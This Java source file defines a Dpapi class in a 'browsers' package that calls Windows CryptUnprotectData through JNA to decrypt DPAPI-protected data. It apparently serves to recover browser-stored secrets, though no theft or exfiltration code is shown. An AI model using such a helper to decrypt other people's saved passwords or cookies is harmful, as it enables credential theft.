package noface.browsers;

import noface.browsers.win.Crypt32Lib;
import noface.browsers.win.WinCrypt;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Kernel32;

public final class Dpapi {

    private static volatile Crypt32Lib lib;

    private static Crypt32Lib lib() {
        Crypt32Lib cur = lib;
        if (cur != null) return cur;
        synchronized (Dpapi.class) {
            if (lib == null) lib = Crypt32Lib.load();
            return lib;
        }
    }

    public static byte[] unprotect(byte[] blob) {
        if (blob == null || blob.length == 0) return null;
        Crypt32Lib crypt = lib();
        if (crypt == null) return null;
        WinCrypt.DATA_BLOB input = new WinCrypt.DATA_BLOB(blob);
        WinCrypt.DATA_BLOB output = new WinCrypt.DATA_BLOB();
        try {
            input.write();
            output.write();
            boolean ok = crypt.CryptUnprotectData(input, null, null, null, null, 0, output);
            if (!ok) return null;
            output.read();
            byte[] data = output.getData();
            freeBlob(output);
            return data;
        } catch (Throwable t) {
            return null;
        }
    }

    private static void freeBlob(WinCrypt.DATA_BLOB blob) {
        try {
            if (blob != null && blob.pbData != null) {
                Pointer p = blob.pbData;
                blob.pbData = null;
                blob.cbData = 0;
                Kernel32.INSTANCE.LocalFree(p);
            }
        } catch (Throwable ignored) {
        }
    }

    private Dpapi() {}
}
